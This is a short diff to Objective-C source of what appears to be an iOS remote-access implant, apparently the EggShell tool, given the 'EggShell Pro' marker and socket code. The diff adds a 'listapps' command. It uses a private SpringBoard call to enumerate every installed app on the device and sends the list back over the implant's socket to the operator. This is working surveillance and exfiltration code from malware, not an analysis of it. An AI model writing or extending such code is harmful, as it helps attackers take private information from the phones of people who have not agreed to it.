@@ -471,6 +471,17 @@ int sockfd;
     #pragma GCC diagnostic pop
 }
 
+-(void)listapps {
+    NSString *apps = @"";
+    CFArrayRef ary = SBSCopyApplicationDisplayIdentifiers(false, false);
+    for(CFIndex i = 0; i < CFArrayGetCount(ary); i++) {
+        if (CFArrayGetValueAtIndex(ary, i)) {
+            apps = [NSString stringWithFormat:@"%@%@\n",apps,CFArrayGetValueAtIndex(ary, i)];
+        }
+    }
+    [self sendString:apps:_skey];
+}
+
 //MARK: EggShell Pro
 
 -(void)mcSendNoReply:(NSString *)message {
